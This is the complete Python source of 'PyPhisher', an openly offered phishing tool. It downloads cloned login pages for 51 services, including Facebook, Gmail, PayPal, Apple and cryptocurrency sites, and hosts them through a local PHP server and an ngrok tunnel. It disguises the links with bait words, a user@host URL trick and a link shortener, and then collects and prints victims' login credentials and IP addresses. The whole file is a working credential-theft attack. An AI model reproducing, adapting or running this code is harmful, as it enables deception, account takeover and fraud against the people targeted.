# -*- coding: UTF-8 -*-
# Tool    : PyPhisher
# Version : 1.0
# Author  : KasRoudra
# Github  : https://github.com/KasRoudra
# Contact : https://m.me/KasRoudra
# PyPhisher is a phishing tool in python
# Facebook Phishing, Github Phishing, Instagram Phishing and 40+ other sites available
# Portable file/script
# If you copy open source code, consider giving credit

"""
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

Copyright (C) 2021 KasRoudra (https://github.com/KasRoudra)
"""

import os, sys, time, socket, json
from urllib.request import urlretrieve
from os import popen, system
from time import sleep

# Normal
black="\033[0;30m"
red="\033[0;31m"
green="\033[0;32m"
yellow="\033[0;33m"  
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
white="\033[0;37m"

root= popen("cd $HOME && pwd").read().strip()
socket.setdefaulttimeout(30)

ask = green + '[' + white + '?' + green + '] '+ yellow
success = green + '[' + white + '√' + green + '] '
error = red + '[' + white + '!' + red + '] '
info= yellow + '[' + white + '+' + yellow + '] '+ cyan

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

logo='''
'''+red+'''  _____       _____  _     _     _               
'''+cyan+''' |  __ \     |  __ \| |   (_)   | |              
'''+yellow+''' | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
'''+blue+''' |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
'''+red+''' | |   | |_| | |    | | | | \__ \ | | |  __/ |   
'''+yellow+''' |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
'''+green+'''         __/ |                                   
'''+cyan+'''        |___/                   '''+red+'''[By KasRoudra]
'''

# Website chooser
def options():
    print()
    print(green+'['+white+'01'+green+']'+yellow+' Facebook Traditional    '+green+'['+white+'18'+green+']'+yellow+' Tiktok        '+green+'['+white+'35'+green+']'+yellow+' Yandex')
    print(green+'['+white+'02'+green+']'+yellow+' Facebook Voting         '+green+'['+white+'19'+green+']'+yellow+' Twitch        '+green+'['+white+'36'+green+']'+yellow+' Stackoverflow')
    print(green+'['+white+'03'+green+']'+yellow+' Facebook Security       '+green+'['+white+'20'+green+']'+yellow+' Pinterest     '+green+'['+white+'37'+green+']'+yellow+' VK')
    print(green+'['+white+'04'+green+']'+yellow+' Messenger               '+green+'['+white+'21'+green+']'+yellow+' SnapChat      '+green+'['+white+'38'+green+']'+yellow+' VK Poll')
    print(green+'['+white+'05'+green+']'+yellow+' Instagram Traditional   '+green+'['+white+'22'+green+']'+yellow+' LinkedIn      '+green+'['+white+'39'+green+']'+yellow+' Xbox')
    print(green+'['+white+'06'+green+']'+yellow+' Insta Auto Followers    '+green+'['+white+'23'+green+']'+yellow+' Ebay          '+green+'['+white+'40'+green+']'+yellow+' MediaFire')
    print(green+'['+white+'07'+green+']'+yellow+' Insta 1000 Followers    '+green+'['+white+'24'+green+']'+yellow+' Quora         '+green+'['+white+'41'+green+']'+yellow+' Gitlab')
    print(green+'['+white+'08'+green+']'+yellow+' Insta Blue Verify       '+green+'['+white+'25'+green+']'+yellow+' LinkedIn      '+green+'['+white+'42'+green+']'+yellow+' Github')
    print(green+'['+white+'09'+green+']'+yellow+' Gmail Old               '+green+'['+white+'26'+green+']'+yellow+' Spotify       '+green+'['+white+'43'+green+']'+yellow+' Apple')
    print(green+'['+white+'10'+green+']'+yellow+' Gmail New               '+green+'['+white+'27'+green+']'+yellow+' Reddit        '+green+'['+white+'44'+green+']'+yellow+' iCloud')
    print(green+'['+white+'11'+green+']'+yellow+' Gmail Poll              '+green+'['+white+'28'+green+']'+yellow+' Adobe         '+green+'['+white+'45'+green+']'+yellow+' Shopify')
    print(green+'['+white+'12'+green+']'+yellow+' Microsoft               '+green+'['+white+'29'+green+']'+yellow+' Deviantart    '+green+'['+white+'46'+green+']'+yellow+' MySpace')
    print(green+'['+white+'13'+green+']'+yellow+' Netflix                 '+green+'['+white+'30'+green+']'+yellow+' Badoo         '+green+'['+white+'47'+green+']'+yellow+' Shopping')
    print(green+'['+white+'14'+green+']'+yellow+' Paypal                  '+green+'['+white+'31'+green+']'+yellow+' Origin        '+green+'['+white+'48'+green+']'+yellow+' Cryptocurrency')
    print(green+'['+white+'15'+green+']'+yellow+' Steam                   '+green+'['+white+'32'+green+']'+yellow+' Dropbox       '+green+'['+white+'49'+green+']'+yellow+' SnapChat2')
    print(green+'['+white+'16'+green+']'+yellow+' Twitter                 '+green+'['+white+'33'+green+']'+yellow+' Yahoo         '+green+'['+white+'50'+green+']'+yellow+' Verizon')
    print(green+'['+white+'17'+green+']'+yellow+' PlayStation             '+green+'['+white+'34'+green+']'+yellow+' Wordpress     '+green+'['+white+'51'+green+']'+yellow+' Wi-Fi')    
    print()
    print()
    print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  About       ')
    print()

# Process killer
def killer():
    if system("pidof php > /dev/null 2>&1")==0:
        system("killall php")
    if system("pidof ngrok > /dev/null 2>&1")==0:
        system("killall ngrok")    

# Download progressbar
def reporthook(blocknum, blocksize, totalsize):
    readsofar = blocknum * blocksize
    if totalsize > 0:
        percent = readsofar * 1e2 / totalsize
        s = "\r%5.1f%% %*d / %d" % (
            percent, len(str(totalsize)), readsofar, totalsize)
        sys.stderr.write(s)
        if readsofar >= totalsize:
            sys.stderr.write("\n")
    else:
        sys.stderr.write("read %d\n" % (readsofar,))

# Print logo
def slowprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)

# Print lines        
def sprint(n):
    for word in n + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)
        
# Internet Checker        
def internet(host="8.8.8.8", port=53, timeout=5):
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
    except socket.error:
        print(error+"No internet!")
        time.sleep(2)
        internet()

# Info about tool
def about():
    system("clear")
    slowprint(logo)
    print(red+'[ToolName]  '+cyan+' :[PyPhisher] ')
    print(red+'[Version]   '+cyan+' :[1.0]')
    print(red+'[Author]    '+cyan+' :[KasRoudra] ')
    print(red+'[Github]    '+cyan+' :[https://github.com/KasRoudra] ')
    print(red+'[Messenger] '+cyan+' :[https://m.me/KasRoudra]')
    print(red+'[Email]     '+cyan+' :[kasroudrakrd@gmail.com]')
    print()
    print(green+'['+white+'0'+green+']'+yellow+' Exit                     '+     green+'['+white+'99'+green+']'+yellow+'  Main Menu       ')
    print()    
    abot= input("\n > ")
    if abot== "0":
        exit()
    else:
        main()
        
# First function main        
def main():
    os.system("clear")
    slowprint(logo)
    while True:
        options()
        choose= input(ask+"Select one of the options > "+yellow)
        if choose=="1" or choose == "01":
            folder="facebook"
            mask="https://blue-verified-facebook-free"
            requirements(folder,mask)
        elif choose == "2" or choose == "02":
            folder="fb_advanced"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)
        elif choose == "3" or choose == "03":
            folder="fb_security"
            mask='https://make-your-facebook-secured-and-free-from-hackers'
            requirements(folder,mask)
        elif choose == "4" or choose == "04":
            folder="fb_messenger"
            mask='https://get-messenger-premium-features-free'
            requirements(folder,mask)            
        elif choose == "5" or choose == "05":
            folder="instagram"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)
        elif choose == "6" or choose== "06":
            folder="ig_followers"
            mask='https://get-unlimited-followers-for-instagram'
            requirements(folder,mask)    
        elif choose == "7" or choose == "07":
            folder="insta_followers"
            mask='https://get-1000-followers-for-instagram'
            requirements(folder,mask)    
        elif choose == "8" or choose == "08":
            folder="ig_verify"
            mask='https://blue-badge-verify-for-instagram-free'
            requirements(folder,mask)                
        elif choose == "9" or choose == "09":
            folder="google"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "10":
            folder="google_new"
            mask='https://get-unlimited-google-drive-free'
            requirements(folder,mask)
        elif choose == "11":
            folder="google_poll"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)                           
        elif choose == "12":
            folder="microsoft"
            mask='https://unlimited-onedrive-space-for-free'
            requirements(folder,mask)
        elif choose == "13":
            folder="netflix"
            mask='https://upgrade-your-netflix-plan-free'
            requirements(folder,mask)
        elif choose == "14":
            folder="paypal"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "15":
            folder="steam"
            mask='https://steam-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "16":
            folder="twitter"
            mask='https://get-blue-badge-on-twitter-free'
            requirements(folder,mask)
        elif choose == "17":
            folder="playstation"
            mask='https://playstation-500-usd-gift-card-free'
            requirements(folder,mask)
        elif choose == "18":
            folder="tiktok"
            mask='https://tiktok-free-liker'
            requirements(folder,mask)
        elif choose == "19":
            folder="twitch"
            mask='https://unlimited-twitch-tv-user-for-free'
            requirements(folder,mask)
        elif choose == "20":
            folder="pinterest"
            mask='https://get-a-premium-plan-for-pinterest-free'
            requirements(folder,mask)
        elif choose == "21":
            folder="snapchat"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "22":
            folder="linkedin"
            mask='https://get-a-premium-plan-for-linkedin-free'
            requirements(folder,mask)
        elif choose == "23":
            folder="ebay"
            mask='https://get-500-usd-free-to-your-account'
            requirements(folder,mask)
        elif choose == "24":
            folder="quora"
            mask='https://quora-premium-for-free'
            requirements(folder,mask)
        elif choose == "25":
            folder="protonmail"
            mask='https://protonmail-pro-basics-for-free'
            requirements(folder,mask)
        elif choose == "26":
            folder="spotify"
            mask='https://convert-your-account-to-spotify-premium'
            requirements(folder,mask)
        elif choose == "27":
            folder="reddit"
            mask='https://reddit-official-verified-member-badge'
            requirements(folder,mask)
        elif choose == "28":
            folder="adobe"
            mask='https://get-adobe-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "29":
            folder="deviantart"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "30":
            folder="badoo"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "31":
            folder="origin"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "32":
            folder="dropbox"
            mask='https://get-1TB-cloud-storage-free'
            requirements(folder,mask)
        elif choose == "33":
            folder="yahoo"
            mask='https://grab-mail-from-anyother-yahoo-account-free'
            requirements(folder,mask)
        elif choose == "34":
            folder="wordpress"
            mask='https://unlimited-wordpress-traffic-free'
            requirements(folder,mask)
        elif choose == "35":
            folder="yandex"
            mask='https://grab-mail-from-anyother-yandex-account-free'
            requirements(folder,mask)
        elif choose == "36":
            folder="stackoverflow"
            mask='https://get-stackoverflow-lifetime-pro-membership-free'
            requirements(folder,mask)
        elif choose == "37":
            folder="vk"
            mask='https://vk-premium-real-method-2020'
            requirements(folder,mask)
        elif choose == "38":
            folder="vk_pole"
            mask='https://vote-for-the-best-social-media'
            requirements(folder,mask)               
        elif choose == "39":
            folder="xbox"
            mask='https://get-500-usd-free-to-your-acount'
            requirements(folder,mask)
        elif choose == "40":
            folder="mediafire"
            mask='https://get-1TB-on-mediafire-free'
            requirements(folder,mask)
        elif choose == "41":
            folder="gitlab"
            mask='https://get-1k-followers-on-gitlab-free'
            requirements(folder,mask)
        elif choose == "42":
            folder="github"
            mask='https://get-1k-followers-on-github-free'
            requirements(folder,mask)
        elif choose == "43":
            folder="apple"
            mask='https://get-apple-premium-account-free'
            requirements(folder,mask)
        elif choose == "44":
            folder="icloud"
            mask='https://unlimited-storage-icloud-free'
            requirements(folder,mask)
        elif choose == "45":
            folder="shopify"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "46":
            folder="myspace"
            mask='https://get-1k-followers-on-myspace-free-free'
            requirements(folder,mask)
        elif choose == "47":
            folder="shopping"
            mask='https://get-50%-discount-on-any-sale'
            requirements(folder,mask)
        elif choose == "48":
            folder="cryptocurrency"
            mask='https://get-bitcoins-free'
            requirements(folder,mask)               
        elif choose == "49":
            folder="snapchat2"
            mask='https://view-locked-snapchat-accounts-secretly'
            requirements(folder,mask)
        elif choose == "50":
            folder="verizon"
            mask='https://get-verizon-premium-account-free'
            requirements(folder,mask)
        elif choose == "51":
            folder="wifi"
            mask='https://reconnect-your-wifi'
            requirements(folder,mask)
        elif choose == "99":
            about()
        elif choose=="0":
            exit(0)
        else:
            sprint("\n"+error+"Wrong input")
            main()
        
# Optional function for ngrok url masking
def masking(ngurl):
    website= "https://is.gd/create.php\?format\=simple\&url\="+ngurl
    internet()
    main1= os.popen("curl -s "+website)
    main2=main1.read()
    if not main2.find("gd")!=-1:
        sprint(error+"Service not available")
        waiter()
    main= main2.replace("https://", "")
    domain= input("\n"+ask+"Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint("\n"+error+"No domain!")
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            sprint("\n"+success+"Your url is > https://"+ main)          
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= "https://"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)           
        waiter()
    if (domain.find("http://")!=-1 or domain.find("https://")!=-1):
        bait= input("\n"+ask+"Enter bait words without space and hyphen (Example: free-money, pubg-mod) > ")
        if (bait==""):
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)          
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()
    else:
        domain= "https://"+domain
        bait= input("\n"+ask+"Enter bait words without space and hyphen(Example: free-money, pubg-mod) > ")
        if bait=="":
            sprint("\n"+error+"No bait word!")
            final= domain+"@"+main
            sprint("\n"+success+"Your url is > "+ final)          
            waiter()
        if bait.find(" ")!=-1:
            sprint("\n"+error+"Space in bait word!")
            waiter()
        final= domain+"-"+bait+"@"+main
        sprint("\n"+success+"Your url is > "+ final)
        waiter()

# Output urls and ask for custom masking
def capture():
    internet()
    os.system("wget -O tunnels.json http://localhost:4040/api/tunnels > /dev/null 2>&1")
    with open('tunnels.json') as data_file:    
        datajson = json.load(data_file)
    os.remove("tunnels.json")
    os.system("rm -rf "+root+"/.site/ip.txt")
    for i in datajson['tunnels']:
       ngurl = i['public_url']
    if ngurl=="":
        sprint(error+"Ngrok Error!")
        killer()
        exit(1)
    if not ngurl.find("https")!=-1:      
        ngurl=ngurl.replace("http","https")   

    with open(root+"/.site/.info.txt", "r") as inform:
        masked=inform.read()
        
    sprint("\n"+success+"Your urls are given below: \n")
    system("rm -rf $HOME/.site/ip.txt")
    sprint(info+"URL 1 > "+yellow+ngurl)
    sprint(info+"URL 2 > "+yellow+masked.strip()+"@"+ngurl.replace("https://",""))
    cust= input(ask+"Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(ngurl)
    waiter()

# Last function capturing credentials 
def waiter():
    sprint("\n"+info+blue+"Waiting for login info...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
    try:
        while True:
            if os.path.isfile(root+"/.site/usernames.txt"):
                print("\n"+success+"Victim login info found!")
                system("cat $HOME/.site/usernames.txt")
                sprint("\n"+info+"Saved in usernames.txt")
                print("\n"+info+blue+"Waiting for next....."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/usernames.txt >> usernames.txt")
                os.remove(root+"/.site/usernames.txt")
            sleep(0.5)
            if os.path.isfile(root+"/.site/ip.txt"):
                print("\n"+success+"Victim ip found!")
                system("cat $HOME/.site/ip.txt")
                sprint("\n"+info+"Saved in ip.txt")
                print("\n"+info+blue+"Waiting for next...."+cyan+"Press "+red+"Ctrl+C"+cyan+" to exit")
                system("cat $HOME/.site/ip.txt >> ip.txt")
                os.remove(root+"/.site/ip.txt")
            sleep(0.5)
    except KeyboardInterrupt:
        sprint("\n"+info+"Thanks for using. Have a good day!")
        exit(0)
        
# 2nd function checking requirements and download files 
def requirements(folder,mask):
    internet()
    if os.path.exists("/data/data/com.termux/files/home"):
        if system("command -v proot  > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
        if not popen("pwd").read().find("/data/data/com.termux/files/home")!=-1:
            sprint("\n"+error+"Invalid location. Run from home directory")
            exit(1)
    if system("command -v php > /dev/null 2>&1")!=0:
        system("apt update && apt upgrade -y")
        sprint(info+"Installing php.....")
        system("apt install php -y")
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(info+"Installing unzip.....")
        system("apt install unzip -y")        
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(info+"Installing curl....")
        system("apt install curl -y")
    if system("command -v php > /dev/null 2>&1")!=0:
        sprint(error+"PHP cannot be installed. Install it manually!")
        exit(1)
    if system("command -v unzip > /dev/null 2>&1")!=0:
        sprint(error+"Unzip cannot be installed. Install it manually!")
        exit(1)
    if system("command -v curl > /dev/null 2>&1")!=0:
        sprint(error+"Curl cannot be installed. Install it manually!")
        exit(1)
    killer()
    x=popen("uname -m").read()
    while not os.path.isfile(root+"/.ngrokfolder/ngrok"):
        sprint("\n"+info+"Downloading ngrok.....")
        internet()
        system("rm -rf file.zip")
        if x.find("aarch64")!=-1:
            urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz", "file.zip", reporthook)
            system("tar -zxf file.zip > /dev/null 2>&1")
            os.remove("file.zip")
            system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
            system("mv -f ngrok "+root+"/.ngrokfolder")            
            break
        if x.find("arm")!=-1:
            urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "file.zip", reporthook)
            system("unzip file.zip > /dev/null 2>&1")
            os.remove("file.zip")
            system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
            system("mv -f ngrok "+root+"/.ngrokfolder")            
            break
        if x.find("x86_64")!=-1:
            urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "file.zip", reporthook)
            system("unzip file.zip > /dev/null 2>&1")
            os.remove("file.zip")
            system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
            system("mv -f ngrok "+root+"/.ngrokfolder")
            break
        else:
            urlretrieve("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip", "file.zip", reporthook)
            system("unzip file.zip > /dev/null 2>&1")
            os.remove("file.zip")
            system("chmod +x ngrok && mkdir "+root+"/.ngrokfolder")
            system("mv -f ngrok "+root+"/.ngrokfolder")
    if system("pidof php > /dev/null 2>&1")==0:
        sprint(error+"Previous php still running! Please restart terminal and try again")
        exit()
    if system("pidof ngrok > /dev/null 2>&1")==0:
        sprint(error+"Previous ngrok still running. Please restart terminal and try again")
        exit()    
    while True:
        if os.path.exists(root+"/.site"):
            system("rm -rf $HOME/.site && mkdir $HOME/.site")
            break
        else:
            system("mkdir $HOME/.site")
            break
    if(os.path.isfile("websites.zip")):
        system("rm -rf $HOME/.websites && mkdir $HOME/.websites")
        system("unzip websites.zip -d $HOME/.websites")
        os.remove("websites.zip")
    while True:
        if os.path.exists(root+"/.websites/"+folder):
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
        else:
            internet()
            sprint("\n"+info+"Downloading required files.....\n")
            system("rm -rf site.zip")
            urlretrieve("https://github.com/KasRoudra/files/raw/main/phishingsites/"+folder+".zip", "site.zip", reporthook)
            if not os.path.exists(root+"/.websites"):
                system("mkdir $HOME/.websites")
            system("cd $HOME/.websites && mkdir "+folder)
            system("unzip site.zip -d $HOME/.websites/"+folder)
            os.remove("site.zip")
            system("cp -r $HOME/.websites/"+folder+"/* $HOME/.site")
            break
    with open(".info.txt", "w") as inform:
        inform.write(mask)
    system("mv -f .info.txt $HOME/.site")
    system("clear")
    slowprint(logo)
    if root.find("termux")!=-1:
        sprint("\n"+info+blue+"If you haven't enabled hotspot, please enable it!")
        sleep(3)
    sprint("\n"+info+yellow+"Initializing PHP server at localhost:8080....")
    internet()
    system("cd $HOME/.site && php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
    sleep(2)
    while True:
        if not system("curl --output /dev/null --silent --head --fail 127.0.0.1:8080"):
            sprint("\n"+info+"PHP Server has started successfully!")
            break
        else:
            sprint(error+"PHP Error")
            killer()
            exit(1)
    sprint("\n"+info+yellow+"Initializing Ngrok at same address.....")
    internet()
    while True:
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system("cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            break
        else:    
            system("cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:8080 > /dev/null 2>&1 &")
            break
    if os.path.exists("/data/data/com.termux/files/home"):
        internet()
        l=0
        while l<10:
            l+=1
            if os.popen("curl -s http://127.0.0.1:4040/api/tunnels").read().find("ngrok")!=-1:
                sprint("\n"+info+"Ngrok has started successfully!")
                sleep(1)
                capture()
            else:
                sleep(1)
        sprint("\n"+error+"Ngrok error. Turn on hotspot and restart termux!")
        killer()
        exit(1)
    else:
        internet()
        k=0
        while k<10:
            k+=1
            if os.popen("curl -s http://127.0.0.1:4040/api/tunnels").read().find("ngrok")!=-1:
                sprint("\n"+info+"Ngrok has started successfully!")
                sleep(1)
                capture()
            else:
                sleep(1)        
        sprint("\n"+error+"Ngrok can't start!")
        killer()
        exit(1)
main()
# If this code helped you, consider staring repository. Your stars encourage me a lot!